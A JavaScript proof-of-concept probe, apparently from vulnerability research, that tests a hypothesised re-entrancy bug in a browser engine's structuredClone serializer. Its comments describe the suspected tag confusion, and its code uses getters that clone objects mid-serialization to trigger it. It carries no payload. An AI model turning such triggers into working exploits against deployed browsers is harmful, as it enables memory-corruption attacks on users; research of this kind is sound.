// Candidate cfe38930db: "Race condition in CloneSerializer::dumpIfTerminal allows for injecting
// arbitrary deserialization" (2024-10-31, pre-fix signals 2/3 present in Sony's tree).
//
// Hypothesis: serialization invokes user code - getters - while the serializer's object/string pools are
// mid-update. A getter that re-enters the serializer (nested structuredClone) or mutates the graph being
// walked can desynchronise the pool indices, so the deserializer reads a different tag than was written.
// That would be tag confusion in the deserializer, reachable straight from JS.
var shared = { name: 'shared-' + new Array(64).join('Q') };
var reentrant = {
  get a() { structuredClone(shared); return 'A'; },
  get b() { structuredClone([shared, shared]); return 'B'; },
  get c() { return 'C'; }
};
try { structuredClone(reentrant); } catch (e) { }
try { structuredClone([reentrant, reentrant]); } catch (e) { }

// Same object serialised inside its own getter.
var selfRef = {};
Object.defineProperty(selfRef, 'p', {
  get: function () { try { structuredClone(selfRef); } catch (e) { } return 1; },
  enumerable: true
});
try { structuredClone(selfRef); } catch (e) { }
